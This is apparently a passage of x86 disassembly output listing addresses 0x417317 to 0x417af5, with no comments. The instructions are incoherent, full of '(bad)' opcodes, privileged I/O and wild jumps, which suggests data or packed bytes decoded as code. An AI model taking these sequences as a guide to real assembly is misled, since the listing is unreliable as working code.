  417317:	and    esi,DWORD PTR [edx+0x4207c80]
  41731d:	xlat   BYTE PTR ds:[ebx]
  41731e:	(bad)  
  41731f:	fisub  WORD PTR [ebx-0x2a]
  417322:	sbb    DWORD PTR [ecx-0x1c],esi
  417325:	imul   ecx,edi,0x7e
  417328:	push   ds
  417329:	outs   dx,DWORD PTR ds:[esi]
  41732a:	push   ss
  41732b:	mov    dl,0x4a
  41732d:	dec    edx
  41732e:	mov    gs,WORD PTR [eax-0x449967f5]
  417334:	pop    ecx
  417335:	ds mov dh,0x9f
  417338:	ror    BYTE PTR [edx],1
  41733a:	(bad)  
  41733b:	mov    ecx,0x387c23db
  417340:	(bad)  
  417342:	mov    ah,0x80
  417344:	hlt    
  417345:	push   ss
  417346:	cmp    eax,0xa06d868a
  41734b:	jmp    0x8cfc00a1
  417350:	(bad)
  417354:	mov    esp,esp
  417356:	mov    ds,WORD PTR [ebx+ecx*8+0x27291898]
  41735d:	fsub   QWORD PTR [ebx-0x1f]
  417360:	(bad)  
  417361:	sahf   
  417362:	jb     0x4172e4
  417364:	test   BYTE PTR [ecx],ah
  417366:	mov    ebp,0x871f1353
  41736b:	mov    bl,0x82
  41736d:	cmp    esp,ebp
  41736f:	inc    edx
  417370:	enter  0xa73d,0x50
  417374:	ins    BYTE PTR es:[edi],dx
  417375:	or     BYTE PTR [edi-0x753277ac],0xf
  41737c:	fnsave [ebx]
  41737e:	stc    
  41737f:	pop    ebp
  417380:	sti    
  417381:	xchg   BYTE PTR ds:0xec363ea4,ah
  417387:	push   0xf6a65008
  41738c:	into   
  41738d:	es inc edi
  41738f:	imul   edi,DWORD PTR [edi-0x49],0x4a
  417393:	je     0x417358
  417395:	push   ebp
  417396:	shl    DWORD PTR [ecx],cl
  417398:	and    eax,0x89034003
  41739d:	mov    cl,0x35
  41739f:	leave  
  4173a0:	sbb    ch,BYTE PTR [ebp-0x42]
  4173a3:	jge    0x417358
  4173a5:	lock pop eax
  4173a7:	loope  0x4173c3
  4173a9:	test   al,0x9d
  4173ab:	mov    ds:0xf9718dd,eax
  4173b0:	ds and bh,0x86
  4173b4:	ins    DWORD PTR es:[edi],dx
  4173b5:	sahf   
  4173b6:	dec    ebx
  4173b7:	pop    ds
  4173b8:	retf   
  4173b9:	mov    ah,0xb2
  4173bb:	rcl    bl,1
  4173bd:	sbb    BYTE PTR [eax+0x1f160780],ah
  4173c3:	add    ebp,esp
  4173c5:	dec    eax
  4173c6:	dec    esi
  4173c7:	iret   
  4173c8:	(bad)  
  4173c9:	sub    al,0x5d
  4173cb:	add    esp,ebp
  4173cd:	ins    DWORD PTR es:[edi],dx
  4173ce:	retf   
  4173cf:	xor    eax,0x662e3e38
  4173d4:	int3   
  4173d5:	cmp    dl,BYTE PTR [edx-0x5c]
  4173d8:	sbb    al,0x9a
  4173da:	and    ebx,DWORD PTR [ecx-0x2ffda035]
  4173e0:	adc    DWORD PTR [edi],ecx
  4173e2:	unpcklps xmm5,XMMWORD PTR [ebx+ebp*2]
  4173e6:	cmp    BYTE PTR [edi+0x2bacc18f],al
  4173ec:	add    BYTE PTR [edx],al
  4173ee:	(bad)  
  4173f0:	jmp    0x4173d9
  4173f2:	adc    ecx,DWORD PTR [ebx]
  4173f4:	outs   dx,BYTE PTR ds:[esi]
  4173f5:	fwait
  4173f6:	stc    
  4173f7:	call   0x3e65b59d
  4173fc:	add    al,0x49
  4173fe:	stos   DWORD PTR es:[edi],eax
  4173ff:	push   ss
  417400:	ins    DWORD PTR es:[edi],dx
  417401:	ins    DWORD PTR es:[edi],dx
  417402:	inc    ebp
  417403:	ficomp WORD PTR ds:0xdafd9d3e
  417409:	dec    ebp
  41740a:	sahf   
  41740b:	stos   DWORD PTR es:[edi],eax
  41740c:	mov    ds,WORD PTR [ecx]
  41740e:	nop
  41740f:	sbb    BYTE PTR [ecx],bh
  417411:	(bad)  
  417412:	dec    edx
  417413:	scas   al,BYTE PTR es:[edi]
  417414:	bound  ebx,QWORD PTR [edx]
  417416:	xor    DWORD PTR [ebx-0x4d48ffcb],edi
  41741c:	inc    edi
  41741d:	cmove  edi,DWORD PTR [ecx+0x6c466fc2]
  417424:	and    esi,DWORD PTR [ecx-0x9ab24dc]
  41742a:	sub    DWORD PTR [ecx-0x6b],esp
  41742d:	mov    ah,0x59
  41742f:	inc    esi
  417430:	adc    BYTE PTR [edi+0x515419ac],bh
  417436:	mov    ecx,DWORD PTR [ebx+ebp*1]
  417439:	jg     0x41746c
  41743b:	push   esp
  41743c:	mov    BYTE PTR [esi-0x23],dl
  41743f:	loope  0x417411
  417441:	lods   al,BYTE PTR ds:[esi]
  417442:	iret   
  417443:	retf   
  417444:	push   edx
  417445:	jo     0x41741f
  417447:	in     al,dx
  417448:	mov    ah,0xe3
  41744a:	(bad)  
  41744b:	jge    0x417496
  41744d:	sbb    esp,DWORD PTR [ebx]
  41744f:	stc    
  417450:	mov    al,ds:0x6ef9a49d
  417455:	fcom   st(2)
  417457:	test   eax,0xec3e67f4
  41745c:	shl    bh,1
  41745e:	repz rcr BYTE PTR [ecx],1
  417461:	repnz cmp edi,edx
  417464:	xchg   ebp,eax
  417465:	push   cs
  417466:	or     dh,ah
  417468:	rcl    BYTE PTR [edx-0x7c26ad02],1
  41746e:	pop    ecx
  41746f:	fidiv  WORD PTR [ebx+0x5bf6d881]
  417475:	(bad)  
  417476:	les    ebp,FWORD PTR [ebx]
  417478:	fimul  DWORD PTR [esi]
  41747a:	(bad)  
  41747b:	inc    edx
  41747c:	sti    
  41747d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41747e:	push   eax
  41747f:	stc    
  417480:	cmp    DWORD PTR [eax-0x5606da8b],eax
  417486:	clc    
  417487:	mov    ah,BYTE PTR [eax]
  417489:	jno    0x41748f
  41748b:	pop    edx
  41748c:	dec    eax
  41748d:	fisub  DWORD PTR [ecx]
  41748f:	fadd   DWORD PTR [edi+0x30]
  417492:	mov    edx,ecx
  417494:	int    0xd
  417496:	sti    
  417497:	es or  al,0x35
  41749a:	mov    bh,BYTE PTR [edx+0x64]
  41749d:	mov    dl,0x4b
  41749f:	ficomp DWORD PTR [eax+0x54c3b121]
  4174a5:	test   BYTE PTR [esi-0xa],ah
  4174a8:	mov    ah,BYTE PTR [ebp+0x2a]
  4174ab:	xor    ah,BYTE PTR [edi-0x4ad1802c]
  4174b1:	mov    edx,0xd8b2edcf
  4174b6:	stos   DWORD PTR es:[edi],eax
  4174b7:	shr    dl,0xeb
  4174ba:	(bad)  
  4174bb:	xor    eax,DWORD PTR [eax]
  4174bd:	jmp    0xcd136039
  4174c2:	mov    fs,ebx
  4174c4:	clc    
  4174c5:	cmp    al,0x56
  4174c7:	add    al,0x14
  4174c9:	test   DWORD PTR [esi-0x57],eax
  4174cc:	data16 or bh,BYTE PTR [edx+0x7c]
  4174d0:	push   es
  4174d1:	rcl    BYTE PTR [ecx+eiz*1-0x77],1
  4174d5:	and    al,0x10
  4174d7:	mov    esi,0xdc2ee6d3
  4174dc:	adc    al,0xce
  4174de:	ficom  DWORD PTR [ecx+0x11]
  4174e1:	push   ebp
  4174e2:	ffree  st(6)
  4174e4:	or     DWORD PTR [edi+0x7c],esi
  4174e7:	nop
  4174e8:	sub    cl,BYTE PTR [ebp-0x41]
  4174eb:	jae    0x417547
  4174ed:	sbb    bl,BYTE PTR [edi-0x28c49b54]
  4174f3:	xchg   ebp,eax
  4174f4:	cmp    eax,0x50e6ef8e
  4174f9:	imul   esp,DWORD PTR [eax+0x56],0xffffffac
  4174fd:	add    eax,0xfaaac764
  417502:	jnp    0x4174ff
  417504:	stos   DWORD PTR es:[edi],eax
  417505:	out    0xa8,al
  417507:	mov    ds:0x941a1a20,al
  41750c:	stos   BYTE PTR es:[edi],al
  41750d:	pop    es
  41750e:	outs   dx,BYTE PTR ds:[esi]
  41750f:	and    DWORD PTR [edi+0x1d0b7026],esi
  417515:	push   0x926f9fac
  41751a:	(bad)  
  41751b:	jmp    0xa8c1ea6a
  417520:	inc    edi
  417521:	xor    BYTE PTR [ebx],dl
  417523:	les    esi,FWORD PTR [esi+0x59]
  417526:	push   edx
  417527:	mov    esp,0x920c0acc
  41752c:	sahf   
  41752d:	sahf   
  41752e:	fmul   DWORD PTR [ebp+0x20]
  417531:	jg     0x417579
  417533:	jmp    0x2ea78e0a
  417538:	test   al,0x5
  41753a:	cmp    edi,DWORD PTR [ebx]
  41753c:	pop    edi
  41753d:	popa   
  41753e:	jp     0x417530
  417540:	cmc    
  417541:	nop
  417542:	xchg   ecx,eax
  417543:	or     eax,0x9f34f22
  417548:	adc    DWORD PTR [edx+0x2198d139],eax
  41754e:	mov    cl,0xb8
  417550:	int3   
  417551:	push   es
  417552:	or     al,0xb3
  417554:	mov    ds:0x8ac45465,eax
  417559:	pop    edi
  41755a:	jmp    0x31d18238
  41755f:	mov    eax,0x56853764
  417564:	int3   
  417565:	or     dl,bl
  417567:	push   edi
  417568:	(bad)  
  417569:	pop    esp
  41756a:	mov    ch,0xa1
  41756c:	jp     0x4175e6
  41756e:	add    BYTE PTR [ebp-0x4],0x1c
  417572:	xor    eax,0xf3863679
  417577:	not    BYTE PTR [esi+0x36ba1ab]
  41757d:	sbb    al,0xe9
  41757f:	and    al,0x68
  417581:	xor    DWORD PTR [ecx],eax
  417583:	inc    ecx
  417584:	cwde   
  417585:	jmp    0x4175b2
  417587:	pusha  
  417588:	add    al,BYTE PTR [ebx+0x11]
  41758b:	imul   ecx,DWORD PTR [eax+0x6546effd],0x9
  417592:	mov    esi,0x643c61a4
  417597:	or     cl,BYTE PTR [eax-0x3cafc8d]
  41759d:	daa    
  41759e:	cdq    
  41759f:	push   esp
  4175a0:	xchg   ebp,eax
  4175a1:	loopne 0x41760b
  4175a3:	sti    
  4175a4:	and    DWORD PTR [eax-0x56],0x36dee42b
  4175ab:	hlt    
  4175ac:	lea    eax,[edi]
  4175ae:	dec    eax
  4175b0:	mov    dh,0x62
  4175b2:	addr16 sub al,0x74
  4175b5:	cmp    DWORD PTR [eax],eax
  4175b7:	ja     0x417613
  4175b9:	loop   0x4175cc
  4175bb:	mov    ebp,0xbfe9bdaf
  4175c0:	push   edx
  4175c1:	cmp    ah,BYTE PTR [ebp+0x25f0f8c1]
  4175c7:	in     eax,0xdd
  4175c9:	ret    
  4175ca:	ret    0x2858
  4175cd:	inc    esi
  4175ce:	fwait
  4175cf:	jo     0x417576
  4175d1:	or     al,0xf
  4175d3:	inc    eax
  4175d4:	jbe    0x4175b5
  4175d6:	ss adc ebp,ecx
  4175d9:	xchg   BYTE PTR fs:[edx+0x7df79ac1],bl
  4175e0:	xchg   BYTE PTR [ebx-0x973ab0b],dl
  4175e6:	cs inc edi
  4175e8:	mov    ah,0xcb
  4175ea:	add    eax,0x8e321b33
  4175ef:	je     0x417606
  4175f1:	push   ds
  4175f2:	cmp    bh,BYTE PTR [ecx-0x5]
  4175f5:	stc    
  4175f6:	popa   
  4175f7:	adc    BYTE PTR [ebp-0x60],0xca
  4175fb:	mov    ecx,0xe7cbf11f
  417600:	nop
  417601:	in     eax,dx
  417602:	mul    BYTE PTR [esp+ecx*8-0x14cbdb4e]
  417609:	aas    
  41760a:	pusha  
  41760b:	push   esp
  41760c:	mov    ecx,0xe96f9b7f
  417611:	push   edi
  417612:	fucomi st,st(0)
  417614:	(bad)  
  417615:	in     eax,0x32
  417617:	and    dl,bh
  417619:	(bad)  
  41761a:	fisttp QWORD PTR [edx-0x5a2eaad]
  417620:	iret   
  417621:	rol    BYTE PTR [edi],cl
  417623:	xor    edi,DWORD PTR [esi+0x1b44d7fb]
  417629:	xchg   edi,eax
  41762a:	int    0x38
  41762c:	(bad)  
  41762d:	fist   DWORD PTR [eax]
  41762f:	and    DWORD PTR ds:0xe353d267,edx
  417635:	int    0xb7
  417637:	pop    ecx
  417638:	es scas al,BYTE PTR es:[edi]
  41763a:	push   es
  41763b:	fmul   DWORD PTR [ebx]
  41763d:	mov    bh,0xef
  41763f:	xor    ah,BYTE PTR [edx]
  417641:	jae    0x417622
  417643:	cmp    cl,BYTE PTR [ebx+0x48]
  417646:	xor    al,0x5c
  417648:	lods   eax,DWORD PTR ds:[esi]
  417649:	fsubrp st(5),st
  41764b:	popa   
  41764c:	cmc    
  41764d:	cmc    
  41764e:	sub    DWORD PTR [eax],eax
  417650:	mov    ah,0x6
  417652:	cmp    ebp,DWORD PTR [eax]
  417654:	jg     0x41762a
  417656:	daa    
  417657:	in     al,0xbe
  417659:	loope  0x417688
  41765b:	arpl   WORD PTR [eax+0xd],bp
  41765e:	jno    0x41768f
  417660:	mov    edi,0xf1f799c7
  417665:	inc    esi
  417666:	into   
  417667:	retf   0x28e0
  41766a:	or     al,BYTE PTR [edi]
  41766c:	jno    0x41762b
  41766e:	ds sti 
  417670:	jno    0x4176e2
  417672:	xor    edi,esi
  417674:	test   BYTE PTR [ebp-0x3c],bh
  417677:	jle    0x4176e4
  417679:	pop    es
  41767a:	mov    bh,0xa9
  41767c:	sbb    al,0x32
  41767e:	out    dx,al
  41767f:	gs pop esi
  417681:	ds xchg edx,eax
  417683:	xchg   edi,eax
  417684:	or     al,0x2e
  417686:	aaa    
  417687:	popf   
  417688:	mov    edi,0x4ed0ca38
  41768d:	jb     0x4176c8
  41768f:	mov    ebx,0xcc876bd9
  417694:	cmc    
  417695:	fs mov ebx,0x43dffc30
  41769b:	sub    al,0x4b
  41769d:	adc    BYTE PTR [edx-0xfa265b],bh
  4176a3:	jge    0x417644
  4176a5:	ins    DWORD PTR es:[edi],dx
  4176a6:	push   ss
  4176a7:	add    eax,0x47b0da9d
  4176ac:	xchg   edi,eax
  4176ad:	or     DWORD PTR [eax-0x6463649d],esi
  4176b3:	and    edx,DWORD PTR [esp+ebp*8+0x41]
  4176b7:	lds    edx,FWORD PTR [esi+edx*8-0x4c]
  4176bb:	push   esi
  4176bc:	clc    
  4176bd:	xchg   edx,eax
  4176be:	mov    cl,0x8e
  4176c0:	call   0x6fca:0xafef0dd5
  4176c7:	and    ecx,DWORD PTR [eax-0x1fa49c16]
  4176cd:	mov    ch,0xbc
  4176cf:	ins    BYTE PTR es:[edi],dx
  4176d0:	ins    DWORD PTR es:[edi],dx
  4176d1:	daa    
  4176d2:	adc    bl,BYTE PTR [ecx+0x2039afd6]
  4176d8:	xor    eax,0x32e5c87
  4176dd:	div    ah
  4176df:	div    BYTE PTR [edi+0x40]
  4176e2:	cmp    DWORD PTR [edx],edi
  4176e4:	pop    eax
  4176e5:	or     eax,0x50f904bb
  4176ea:	or     DWORD PTR [edi],ebp
  4176ec:	scas   al,BYTE PTR es:[edi]
  4176ed:	fwait
  4176ee:	mov    bh,0xd6
  4176f0:	ds aad 0xab
  4176f3:	mov    bl,0x91
  4176f5:	test   al,dl
  4176f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f8:	jle    0x4176c8
  4176fa:	lods   al,BYTE PTR ds:[esi]
  4176fb:	jnp    0x417778
  4176fd:	cmc    
  4176fe:	fisubr WORD PTR [ebx+edx*8-0x497e78d6]
  417705:	fist   DWORD PTR [ecx]
  417707:	es xchg esi,eax
  417709:	pop    esp
  41770a:	stc    
  41770b:	rcr    ebp,cl
  41770d:	lock adc eax,0x22bea31d
  417713:	je     0x417747
  417715:	push   ecx
  417716:	jmp    0x85d7:0xf7e6b1c2
  41771d:	retf   0xd20
  417720:	sbb    BYTE PTR [edx+0x43],bl
  417723:	es pop esi
  417725:	xchg   dl,bl
  417727:	add    al,0xf0
  417729:	xchg   edi,eax
  41772a:	and    eax,0x4267d211
  41772f:	pop    ss
  417730:	pop    ecx
  417731:	mov    dl,0x62
  417734:	and    al,0x46
  417736:	mov    ch,0xd4
  417738:	jg     0x4176fa
  41773a:	pop    ds
  41773b:	mov    bl,0x31
  41773d:	ins    DWORD PTR es:[edi],dx
  41773e:	and    DWORD PTR [esi-0x46],edx
  417741:	inc    edx
  417742:	inc    ebp
  417743:	sti    
  417744:	cmp    DWORD PTR [ebx-0x6d],edi
  417747:	xchg   ebx,eax
  417748:	mov    eax,ds:0xe8481fb1
  41774d:	fwait
  41774e:	push   ecx
  41774f:	adc    BYTE PTR [edi+eax*8],bl
  417752:	in     eax,0xab
  417754:	add    DWORD PTR [ecx],eax
  417756:	cmp    esp,ecx
  417758:	(bad)
  41775b:	pushf  
  41775c:	addr16 clc 
  41775e:	xlat   BYTE PTR ds:[ebx]
  41775f:	mov    al,ds:0x6809c85a
  417764:	rcl    DWORD PTR [eax-0x59b92ae],1
  41776a:	lea    ebx,[ecx-0x589ae04]
  417770:	inc    esi
  417771:	adc    BYTE PTR [ebx+0x44],ch
  417774:	and    BYTE PTR [eax-0x220bcb44],bl
  41777a:	adc    edi,ebx
  41777c:	in     al,dx
  41777d:	mov    eax,DWORD PTR [eax]
  41777f:	pop    ebx
  417780:	leave  
  417781:	cmp    DWORD PTR [esi],eax
  417783:	sub    eax,0xe935263f
  417788:	addr16 enter 0xacc4,0x9b
  41778d:	sub    BYTE PTR [ebx-0x7f],bl
  417790:	cwde   
  417791:	out    dx,eax
  417792:	lds    edi,FWORD PTR [ebp-0x2663049a]
  417798:	ret    0xb332
  41779b:	jp     0x417734
  41779d:	sub    esi,eax
  41779f:	xchg   ebx,eax
  4177a0:	cmc    
  4177a1:	dec    ecx
  4177a2:	nop
  4177a3:	inc    ebx
  4177a4:	xor    BYTE PTR [esi],ah
  4177a6:	rol    BYTE PTR [eax+0x48],0xc4
  4177aa:	sub    dl,BYTE PTR [eax+0x42b5f0e6]
  4177b0:	lods   al,BYTE PTR ds:[esi]
  4177b1:	mov    cl,0xe7
  4177b3:	sub    al,0x4e
  4177b5:	mov    cl,0x0
  4177b7:	outs   dx,BYTE PTR ds:[esi]
  4177b8:	sbb    eax,0xe8220363
  4177bd:	popf   
  4177be:	dec    esp
  4177bf:	fldcw  WORD PTR [edx]
  4177c1:	jae    0x417830
  4177c3:	popa   
  4177c4:	lea    ebx,[ebx]
  4177c6:	add    eax,0x90ccf6fb
  4177cb:	(bad)  
  4177cc:	mov    bl,bh
  4177ce:	push   es
  4177cf:	rcr    BYTE PTR es:[ebx],0x52
  4177d3:	mov    ecx,0x6b2519d3
  4177d8:	or     ah,BYTE PTR [edx+0x16e904c7]
  4177de:	push   ds
  4177df:	imul   edi,DWORD PTR [ecx],0xffffffb2
  4177e2:	lahf   
  4177e3:	lahf   
  4177e4:	sub    DWORD PTR [edi+ebx*2-0x1f],ecx
  4177e8:	dec    esi
  4177e9:	repnz xchg esi,eax
  4177eb:	push   eax
  4177ec:	clc    
  4177ed:	dec    DWORD PTR [esp+eax*8]
  4177f0:	fcom   QWORD PTR [esp+edx*4]
  4177f3:	push   esp
  4177f4:	jns    0x41783c
  4177f6:	retf   0xb3cb
  4177f9:	imul   ebp,DWORD PTR [edx+0x3b],0xffffff89
  4177fd:	fimul  WORD PTR [edx-0x547f76bf]
  417803:	mov    eax,ds:0x3804a0b2
  417808:	cmp    DWORD PTR [eax-0x4a],ecx
  41780b:	loope  0x417865
  41780d:	ins    BYTE PTR es:[edi],dx
  41780e:	test   al,0xf
  417810:	rol    BYTE PTR [ebx+0x20b7def2],0x7b
  417817:	sub    BYTE PTR [ecx-0x3e],bh
  41781a:	stos   BYTE PTR es:[edi],al
  41781b:	repnz mov ?,WORD PTR [esi+ebp*4-0x170eefbc]
  417823:	pop    ss
  417824:	outs   dx,BYTE PTR ds:[esi]
  417825:	into   
  417826:	ins    BYTE PTR es:[edi],dx
  417827:	call   DWORD PTR [edx-0x7e]
  41782a:	iret   
  41782b:	jbe    0x4177f6
  41782d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41782e:	adc    edx,DWORD PTR [edi-0x53]
  417831:	ret    
  417832:	cmp    esp,DWORD PTR fs:[edx-0x40]
  417836:	add    DWORD PTR [edi],esi
  417838:	mov    eax,ds:0x4e3b7c7a
  41783d:	jmp    0xfb4bd150
  417842:	not    DWORD PTR [eax+eiz*2+0x69]
  417846:	pusha  
  417847:	xchg   ebx,eax
  417848:	xchg   edx,eax
  417849:	dec    eax
  41784a:	repz inc ecx
  41784c:	or     esi,DWORD PTR [ebp+0x52]
  41784f:	push   edi
  417850:	pop    esp
  417851:	add    esi,DWORD PTR [esi-0x1332c778]
  417857:	adc    ecx,DWORD PTR ds:0x50e985a3
  41785d:	and    ah,BYTE PTR [ebx]
  41785f:	scas   al,BYTE PTR es:[edi]
  417860:	int3   
  417861:	dec    edi
  417862:	pusha  
  417863:	pop    ds
  417864:	xor    bl,al
  417866:	leave  
  417867:	ret    0xcec5
  41786a:	dec    edx
  41786b:	das    
  41786c:	sub    BYTE PTR [esi],0x9f
  41786f:	test   bl,0xb1
  417872:	mov    eax,ds:0x2346a03b
  417877:	pop    esp
  417878:	mov    ah,0xff
  41787a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41787b:	lea    ebx,[ebx+edx*1]
  41787e:	push   esp
  41787f:	ret    0xc5cf
  417882:	dec    esp
  417883:	add    ebx,DWORD PTR [edx]
  417885:	mov    ch,0xe7
  417887:	int    0x91
  417889:	pop    ss
  41788a:	pushf  
  41788b:	xchg   edx,eax
  41788c:	mov    ch,0x1f
  41788e:	sbb    al,0x2a
  417890:	mov    dh,0x3f
  417892:	xor    ebp,0x213dfc82
  417898:	xchg   ebx,eax
  417899:	xor    DWORD PTR [edi+0x3e9564ac],0x2030be66
  4178a3:	mov    ds:0x349f7989,eax
  4178a8:	jecxz  0x4178e4
  4178aa:	jns    0x41791a
  4178ac:	or     BYTE PTR [ecx+0x94e1b97],al
  4178b2:	repnz pusha 
  4178b4:	jle    0x417931
  4178b6:	in     al,0x73
  4178b8:	es jmp 0x417868
  4178bb:	jns    0x417903
  4178bd:	in     eax,dx
  4178be:	jnp    0x417878
  4178c0:	dec    esp
  4178c1:	mov    BYTE PTR [edx],dl
  4178c3:	mov    esp,ecx
  4178c5:	add    DWORD PTR [ecx],0xe4f307e5
  4178cb:	imul   ebp,edx,0xb9b5c606
  4178d1:	fld    QWORD PTR [esi+0x428da2f2]
  4178d7:	lods   al,BYTE PTR ds:[esi]
  4178d8:	xor    al,al
  4178da:	push   0xffffff9e
  4178dc:	into   
  4178dd:	call   0xceceee97
  4178e2:	fild   DWORD PTR [esi]
  4178e4:	rol    DWORD PTR [eax],1
  4178e6:	inc    edx
  4178e7:	mov    eax,ds:0xf128201
  4178ec:	xor    ebx,edi
  4178ee:	out    0xe1,al
  4178f0:	and    DWORD PTR [edi],0xa2479962
  4178f6:	dec    edi
  4178f7:	sub    cl,BYTE PTR [esi+esi*2]
  4178fa:	jle    0x41793f
  4178fc:	mov    al,ds:0xb7666ec9
  417901:	ret    0x25ae
  417904:	push   ecx
  417905:	jp     0x4178bc
  417907:	cmp    BYTE PTR [eax-0x7b0415b8],bh
  41790d:	mov    ds:0x6dcf5282,eax
  417912:	popa   
  417913:	cmp    al,cl
  417915:	pop    ecx
  417916:	bound  esp,QWORD PTR [esi+0x2ff4d605]
  41791c:	xlat   BYTE PTR ds:[ebx]
  41791d:	shl    DWORD PTR [ebx+0x4b],cl
  417920:	mov    esp,0xce4a8b74
  417925:	push   cs
  417926:	cmp    al,0xa4
  417928:	mov    BYTE PTR [edi-0x61436b99],dl
  41792e:	stos   BYTE PTR es:[edi],al
  41792f:	xor    al,0x82
  417931:	jmp    0xca8c:0xd6c00986
  417938:	(bad)
  41793c:	imul   ebp,DWORD PTR [esp+ebp*8+0xb],0xa1936fcd
  417944:	or     BYTE PTR [edx-0x5b],ch
  417947:	pmulhuw mm2,mm3
  41794a:	ret    
  41794b:	outs   dx,DWORD PTR ds:[esi]
  41794c:	cmp    edx,edi
  41794e:	push   esi
  41794f:	gs fwait
  417951:	jg     0x4179c2
  417953:	inc    esp
  417954:	pop    eax
  417955:	inc    esi
  417956:	call   0xcdb8aac6
  41795b:	pop    edx
  41795c:	push   eax
  41795d:	addr16 xchg esi,eax
  41795f:	mov    esi,0x1925bc9d
  417964:	dec    edi
  417965:	lds    ebx,FWORD PTR [eax+0x56]
  417968:	adc    ebp,DWORD PTR [ecx-0x38]
  41796b:	out    dx,eax
  41796c:	or     DWORD PTR [ecx],esi
  41796e:	(bad)  [ebp-0x2]
  417971:	lock adc eax,0x494e94a7
  417977:	xor    eax,0xa927c92c
  41797c:	xor    dh,dl
  41797e:	lock sbb BYTE PTR [esi-0x22],0xb8
  417983:	mov    edi,0x2ce9da7e
  417988:	pusha  
  417989:	mov    al,ds:0xf2c67a1
  41798e:	in     eax,dx
  41798f:	push   ecx
  417990:	sub    ebp,DWORD PTR [esp+ebx*1-0x29]
  417994:	xchg   ebx,eax
  417995:	xchg   edi,eax
  417996:	cld    
  417997:	push   ss
  417998:	xor    ah,BYTE PTR [edi]
  41799a:	imul   esp,DWORD PTR [ecx],0x772531c
  4179a0:	pop    es
  4179a1:	sbb    eax,edi
  4179a3:	sbb    al,bh
  4179a5:	(bad)  
  4179a6:	dec    esi
  4179a8:	ss inc esp
  4179aa:	jmp    0x2548b252
  4179af:	dec    ecx
  4179b0:	jo     0xc7b539df
  4179b6:	or     DWORD PTR [esi+edx*4+0x5eba5580],edx
  4179bd:	sahf   
  4179be:	jae    0x417a35
  4179c0:	inc    eax
  4179c1:	mov    ds:0x38d11bd7,eax
  4179c6:	jb     0x417a25
  4179c8:	jge    0x417950
  4179ca:	fstp   DWORD PTR [edi+0x3bbe434b]
  4179d0:	rol    DWORD PTR [ebx],cl
  4179d2:	repnz push edi
  4179d4:	pop    es
  4179d5:	xchg   DWORD PTR [esi-0x33f94969],esi
  4179db:	pop    ds
  4179dc:	leave  
  4179dd:	loop   0x4179b5
  4179df:	lods   al,BYTE PTR ds:[esi]
  4179e0:	jl     0x417a47
  4179e2:	jbe    0x417964
  4179e4:	sti    
  4179e5:	stc    
  4179e6:	jns    0x417a29
  4179e8:	test   eax,0x2b543544
  4179ed:	jmp    0xd57d03ba
  4179f2:	nop
  4179f3:	fwait
  4179f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179f5:	loope  0x4179e5
  4179f7:	xor    ch,BYTE PTR [ebx]
  4179f9:	cdq    
  4179fa:	mov    BYTE PTR [esi+ecx*2+0x23],0x89
  4179ff:	aas    
  417a00:	adc    eax,0x55148004
  417a05:	stos   DWORD PTR es:[edi],eax
  417a06:	add    BYTE PTR [esi],ch
  417a08:	pop    ds
  417a09:	cmp    al,0x21
  417a0b:	cmp    bh,BYTE PTR [edi]
  417a0d:	ja     0x417a08
  417a0f:	fwait
  417a10:	xor    ah,ah
  417a12:	mov    al,ds:0x114ec6fc
  417a17:	pushf  
  417a18:	pop    ds
  417a19:	loope  0x4179b3
  417a1b:	test   DWORD PTR [ebx],0x11829d9f
  417a21:	cwde   
  417a22:	in     al,dx
  417a23:	lds    ecx,FWORD PTR [ebx]
  417a25:	test   BYTE PTR [ebx-0x332a135f],ch
  417a2b:	in     al,0x37
  417a2d:	test   esp,edi
  417a2f:	mov    bl,cl
  417a31:	pop    ss
  417a32:	test   BYTE PTR [ecx],dh
  417a34:	push   cs
  417a35:	aad    0x5a
  417a37:	clc    
  417a38:	idiv   ecx
  417a3a:	aad    0x26
  417a3c:	xchg   eax,esi
  417a3e:	jns    0x417a28
  417a40:	jnp    0x417aa5
  417a42:	mov    edi,0xc38caed0
  417a47:	popf   
  417a48:	div    BYTE PTR [edi-0x2adbef54]
  417a4e:	repz out 0xaa,al
  417a51:	push   ds
  417a52:	ret    
  417a53:	repz cwde 
  417a55:	lea    esp,ds:0xd7b4b5b8
  417a5b:	push   eax
  417a5c:	test   DWORD PTR [esi-0x315ba3c7],esp
  417a62:	sbb    BYTE PTR [edi+esi*2-0x19c061ad],cl
  417a69:	popf   
  417a6a:	loop   0x417a75
  417a6c:	mov    ds:0x8063450b,al
  417a71:	cwde   
  417a72:	adc    eax,0xadf2453b
  417a77:	ret    0x2b85
  417a7a:	pusha  
  417a7b:	into   
  417a7c:	add    ebx,DWORD PTR [ebp-0x46]
  417a7f:	cmp    eax,0xf691df44
  417a84:	add    eax,0x11dffe4f
  417a89:	rol    BYTE PTR [esi+0x4a498892],0xab
  417a90:	jl     0x417abf
  417a92:	dec    esp
  417a93:	test   al,0xa3
  417a95:	shr    BYTE PTR [eax],cl
  417a97:	jmp    0x417a70
  417a99:	inc    esp
  417a9a:	mov    al,ds:0x20b90cc4
  417a9f:	pop    ecx
  417aa0:	pop    eax
  417aa1:	dec    edx
  417aa2:	pop    ds
  417aa3:	(bad)  
  417aa4:	jns    0x417b0f
  417aa6:	mov    BYTE PTR [edx+0x69],bl
  417aa9:	inc    eax
  417aaa:	cld    
  417aab:	mov    ds:0x6308bc0d,eax
  417ab0:	out    0x42,eax
  417ab2:	(bad)  
  417ab3:	fdivr  DWORD PTR gs:[eax+ecx*2]
  417ab7:	push   esp
  417ab8:	adc    eax,0x3afc2bc2
  417abd:	sti    
  417abe:	je     0x417aff
  417ac0:	mov    ds:0x89507729,al
  417ac5:	and    ecx,DWORD PTR [edi-0x7e]
  417ac8:	sahf   
  417ac9:	mov    eax,ds:0x20e96665
  417ace:	daa    
  417acf:	test   al,0x3
  417ad1:	add    bl,BYTE PTR [edi-0x2b]
  417ad4:	jne    0x417b27
  417ad6:	imul   DWORD PTR [edi-0x65e55282]
  417adc:	mov    al,ds:0xc79f564c
  417ae1:	cmp    DWORD PTR [edx-0x7a],eax
  417ae4:	sbb    esp,DWORD PTR [ecx+esi*8+0x313f6729]
  417aeb:	into   
  417aec:	xchg   bh,bl
  417aee:	jne    0x417acb
  417af0:	aam    0x37
  417af2:	rol    DWORD PTR [eax],0x8b
  417af5:	idiv   al
